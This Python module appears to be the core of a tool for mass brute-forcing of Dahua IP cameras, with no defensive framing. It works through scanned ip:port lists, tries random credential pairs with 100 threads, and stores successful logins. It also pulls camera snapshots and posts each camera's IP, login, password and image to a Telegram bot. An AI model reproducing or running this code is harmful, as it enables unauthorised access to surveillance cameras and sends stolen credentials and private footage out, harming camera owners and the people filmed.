from __future__ import annotations

import atexit
import concurrent.futures
from datetime import datetime
import logging
import os
from pathlib import Path
import re
import signal
import sys
import threading

import requests
from tqdm import tqdm

from . import combinations
from . import parse_masscan
from .config import config
from .dahua import DahuaController

LOGGING_FOLDER = Path("dahua_logs")
SNAPSHOTS_FOLDER = Path("snapshots")
FOUND_DEVICES_FILE = Path("found_devices.txt")

LOGGING_FOLDER.mkdir(parents=True, exist_ok=True)
SNAPSHOTS_FOLDER.mkdir(parents=True, exist_ok=True)

log_filename = LOGGING_FOLDER / f'log_{datetime.now().strftime("%Y%m%d-%H%M%S")}.log'
logging.basicConfig(
    filename=str(log_filename),
    level=logging.INFO,
    format='[%(asctime)s] {%(pathname)s:%(lineno)d} %(levelname)s - %(message)s',
    datefmt='%H:%M:%S'
)

stats_lock = threading.Lock()
snapshots_count = 0
alive_count = 0
blocked_count = 0
bruted_devices: list[tuple[str, int, str, str]] = []

_emergency_lock = threading.Lock()
_emergency_done = False
_active_executor: concurrent.futures.ThreadPoolExecutor | None = None


def _append_found_device(device: tuple, filepath: Path | str = FOUND_DEVICES_FILE) -> None:
    try:
        ip = device[0]
        port = device[1]
        login = device[2]
        password = device[3]
        model = device[4] if len(device) > 4 and device[4] else ""
        line = f"{ip}:{port} {login}:{password}" + (f" [{model}]" if model else "")
        with open(filepath, "a", encoding="utf-8") as f:
            f.write(line + "\n")
            f.flush()
            try:
                os.fsync(f.fileno())
            except Exception:
                pass
    except Exception as e:
        logging.error(f"failed to append found device {device}: {e}")


def emergency_save(
    devices: list[tuple] | None = None,
    make_xml: bool = True,
    max_xml_entries: int = 64
) -> tuple[int, list[str]]:
    global bruted_devices
    with stats_lock:
        to_save = list(devices if devices is not None else bruted_devices)

    if not to_save:
        return 0, []

    existing_lines = set()
    if FOUND_DEVICES_FILE.exists():
        try:
            with open(FOUND_DEVICES_FILE, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    existing_lines.add(line.strip())
        except Exception:
            pass

    try:
        with open(FOUND_DEVICES_FILE, "a", encoding="utf-8") as f:
            for dev in to_save:
                ip = dev[0]
                port = dev[1]
                login = dev[2]
                password = dev[3]
                model = dev[4] if len(dev) > 4 and dev[4] else ""
                entry = f"{ip}:{port} {login}:{password}" + (f" [{model}]" if model else "")
                if entry not in existing_lines:
                    f.write(entry + "\n")
                    existing_lines.add(entry)
            f.flush()
            try:
                os.fsync(f.fileno())
            except Exception:
                pass
    except Exception as e:
        logging.error(f"failed emergency txt save: {e}")

    saved_xmls: list[str] = []
    if make_xml:
        try:
            from . import save_to_xml
            saved_xmls = save_to_xml.save_xml(to_save, max_xml_entries=max_xml_entries)
        except Exception as e:
            logging.error(f"failed emergency xml save: {e}")

    return len(to_save), saved_xmls


def _emergency_signal_handler(signum: int, frame) -> None:
    global _emergency_done, _active_executor

    sig_name = "UNKNOWN"
    try:
        sig_name = signal.Signals(signum).name
    except Exception:
        sig_name = str(signum)

    with _emergency_lock:
        if _emergency_done:
            return
        _emergency_done = True

    if _active_executor is not None:
        try:
            _active_executor.shutdown(wait=False, cancel_futures=True)
        except Exception:
            pass

    logging.warning(f"emergency shutdown triggered by signal: {sig_name}")
    print(f"\n\033[1;31m{sig_name}. экстренно сохраняю камеры\033[0m")

    count, xml_files = emergency_save(make_xml=True)
    if count > 0:
        msg = f"сохранено {count} устройств в {FOUND_DEVICES_FILE.name}"
        if xml_files:
            msg += f" и XML для SmartPSS: {', '.join(xml_files)}"
        print(f"\033[1;32m{msg}\033[0m")
    else:
        print("\033[1;33mнайденных камер нет, сохранять нечего\033[0m")

    sys.exit(128 + signum if isinstance(signum, int) else 1)


def setup_signal_handlers() -> None:
    for sig_name in ("SIGTERM", "SIGBREAK", "SIGHUP"):
        if hasattr(signal, sig_name):
            try:
                sig = getattr(signal, sig_name)
                signal.signal(sig, _emergency_signal_handler)
            except (ValueError, OSError, AttributeError):
                pass


def _atexit_handler() -> None:
    global _emergency_done
    if not _emergency_done and bruted_devices:
        emergency_save(make_xml=True)


atexit.register(_atexit_handler)
setup_signal_handlers()


def post_tg(token: str, chat_id: str | int, device: tuple, ss_path: str | None, login: str, password: str, model: str = "") -> bool:
    if not token or not chat_id:
        return False

    url = f"https://{config.tg_endpoint}/bot{token}"
    caption = (
        "📷 <b>нашел новую камеру</b>\n\n"
        f"🌐 айпи: <code>{device[0]}</code>\n"
        f"🌐 порт: <code>{device[1]}</code>\n"
        f"🎥 модель: <code>{model}</code>\n" if model else "неизвестная камера"
        f"👤 логин: <code>{login}</code>\n"
        f"🔑 пароль: <code>{password}</code>"
    )

    try:
        if ss_path and os.path.exists(ss_path):
            with open(ss_path, "rb") as ph:
                files = {"photo": ("snapshot.jpg", ph, "image/jpeg")}
                data = {
                    "chat_id": chat_id,
                    "caption": caption,
                    "parse_mode": "HTML"
                }
                resp = requests.post(f"{url}/sendPhoto", data=data, files=files, timeout=15)
        else:
            data = {
                "chat_id": chat_id,
                "text": caption,
                "parse_mode": "HTML"
            }
            resp = requests.post(f"{url}/sendMessage", data=data, timeout=15)

        if resp.status_code == 200:
            logging.debug(f"user was successfully notified about {device[0]}:{device[1]}")
            return True
        else:
            logging.error(f"telegram API notification error ({resp.status_code}): {resp.text}")
            return False
    except Exception as e:
        logging.error(f"error when notifying via telegram: {e}")
        return False


def get_snapshot(ip: str, port: int, login: str, passw: str) -> str | None:
    global snapshots_count
    try:
        logging.info(f"connecting to {ip}:{port} for snapshot...")
        with DahuaController(ip, port, login, passw) as cam:
            if cam.status != 0:
                return None

            chns = max(1, cam.channels_count)
            for chn in range(chns):
                try:
                    jpeg = cam.get_snapshot(chn)
                    if not jpeg or len(jpeg) < 100:
                        continue

                    safe_login = re.sub(r'[^\w\-]', '_', login)
                    safe_pass = re.sub(r'[^\w\-]', '_', passw)
                    filename = f"{ip}_{port}_{safe_login}_{safe_pass}_chn{chn}.jpg"
                    file_path = SNAPSHOTS_FOLDER / filename

                    with open(file_path, "wb") as ss:
                        ss.write(jpeg)

                    with stats_lock:
                        snapshots_count += 1

                    logging.info(f"({ip}:{port}) saved snapshot of channel {chn}")
                    return str(file_path)
                except Exception as e:
                    logging.info(f"({ip}:{port}) channel {chn} snapshot error: {e}")
                    continue
    except Exception as e:
        logging.error(f"snapshot error for {ip}:{port}: {e}")

    return None


def dhlogin(ip: str, port: int, login: str, passw: str):
    global alive_count, blocked_count

    logging.info(f"trying to login {ip}:{port} with credentials {login}:{passw}")
    try:
        with DahuaController(ip, port, login, passw) as cam:
            if cam.status == 0:
                logging.info(f"{ip}:{port} logged in successfully")
                with stats_lock:
                    alive_count += 1
                return ip, port, login, passw
            elif cam.status == 2:
                logging.warning(f"{ip}:{port} is blocked")
                with stats_lock:
                    blocked_count += 1
                return "blocked"
            else:
                logging.debug(f"unable to login {ip}:{port} with {login}:{passw}")
                return None
    except Exception as e:
        logging.debug(f"connection error to {ip}:{port}: {e}")
        return None


def check_host(host_str: str, cred_list: list, dosnap: bool, notify: bool, token: str | None, chat_id: int | str | None):
    host_str = host_str.strip()
    match = re.match(r"^(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):(\d{1,5})$", host_str)
    if not match:
        logging.warning(f"{host_str} is not a valid address (expected ip:port), skipping")
        return "dead"

    ip = match.group(1)
    port = int(match.group(2))

    for login, password in cred_list:
        res = dhlogin(ip, port, login, password)
        if res == "blocked":
            logging.warning(f"{ip}:{port} blocked login attempts, stopping")
            return "blocked"
        elif res:
            model = ""
            try:
                model = DahuaController.get_model(ip, login, password)
            except Exception as e:
                logging.debug(f"failed to query model for {ip}:{port}: {e}")

            device = (ip, port, login, password, model)
            with stats_lock:
                bruted_devices.append(device)
                _append_found_device(device)

            ss_path = None
            if dosnap:
                ss_path = get_snapshot(ip, port, login, password)

            if notify and token and chat_id:
                post_tg(token, chat_id, (ip, port), ss_path, login, password, model=model)

            return device

    return "dead"


def read_targets(file_path: str) -> list[str]:
    path = Path(file_path)
    if not path.is_file():
        raise FileNotFoundError(f"targets file not found: {file_path}")

    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        first_line = f.readline()
        f.seek(0)
        content = f.read()

    if "#masscan" in first_line or "open tcp" in content or "Discovered open port" in content or content.strip().startswith("["):
        return parse_masscan.parse(str(path))

    return [line.strip() for line in content.splitlines() if line.strip() and not line.strip().startswith("#")]


def brute(
    brute_file_path: str = "input.txt",
    dosnap: bool = True,
    threads: int = 100,
    notify: bool = True,
    status_callback=None,
    show_progress: bool = True,
    make_import_file: bool = True,
    max_entries: int = 64
) -> list[tuple[str, int, str, str]]:
    global bruted_devices, _active_executor
    bruted_devices = []

    try:
        devices = read_targets(brute_file_path)
    except Exception as e:
        logging.error(f"failed to read targets: {e}")
        raise

    if not devices:
        logging.warning("no valid devices found in target file")
        return []

    logging.info(f"loaded {len(devices)} target devices from {brute_file_path}")

    workers = []
    authed_count = 0
    blocked_count = 0
    dead_count = 0

    pbar = None
    if show_progress:
        pbar = tqdm(
            total=len(devices),
            bar_format='[{n_fmt}/{total_fmt}] {bar} | {desc}',
            dynamic_ncols=True
        )
        pbar.set_description_str(f"authed: {authed_count} * blocked: {blocked_count} * dead: {dead_count}")

    executor = concurrent.futures.ThreadPoolExecutor(max_workers=threads)
    _active_executor = executor

    try:
        for device in devices:
            creds = combinations.get_random(5)
            future = executor.submit(
                check_host,
                device,
                creds,
                dosnap,
                notify,
                config.bot_token,
                config.userid
            )
            workers.append(future)

        for future in concurrent.futures.as_completed(workers):
            try:
                res = future.result()
                if isinstance(res, tuple) and len(res) >= 4:
                    authed_count += 1
                    if status_callback:
                        status_callback(res)
                elif res == "blocked":
                    blocked_count += 1
                else:
                    dead_count += 1
            except Exception as e:
                logging.debug(f"worker exception: {e}")
                dead_count += 1
            finally:
                if pbar is not None:
                    pbar.set_description_str(f"authed: {authed_count} * blocked: {blocked_count} * dead: {dead_count}")
                    pbar.update(1)

    except KeyboardInterrupt:
        logging.warning("scanning interrupted by user (SIGINT/Ctrl+C)")
        executor.shutdown(wait=False, cancel_futures=True)
        for w in workers:
            w.cancel()
        if pbar is not None:
            pbar.close()
            pbar = None
        print("\n\033[1;33mсканирование прервано пользователем\033[0m")
        count, xml_files = emergency_save(make_xml=make_import_file, max_xml_entries=max_entries)
        if count > 0:
            msg = f"\033[1;32mсохранено {count} камер в {FOUND_DEVICES_FILE.name}\033[0m"
            if xml_files:
                msg += f"\033[1;36m и XML: {', '.join(xml_files)}\033[0m"
            print(msg)
        else:
            print("\033[1;33mнайденных камер нет\033[0m")
    except Exception as e:
        logging.error(f"bruteforcing was interrupted: {e}")
        executor.shutdown(wait=False, cancel_futures=True)
        for w in workers:
            w.cancel()
        emergency_save(make_xml=make_import_file, max_xml_entries=max_entries)
    finally:
        if pbar is not None:
            pbar.close()
        executor.shutdown(wait=False, cancel_futures=True)
        _active_executor = None

    if bruted_devices and make_import_file:
        try:
            from . import save_to_xml
            save_to_xml.save_xml(bruted_devices, max_xml_entries=max_entries)
        except Exception as e:
            logging.error(f"failed to generate final XML: {e}")

    return list(bruted_devices)
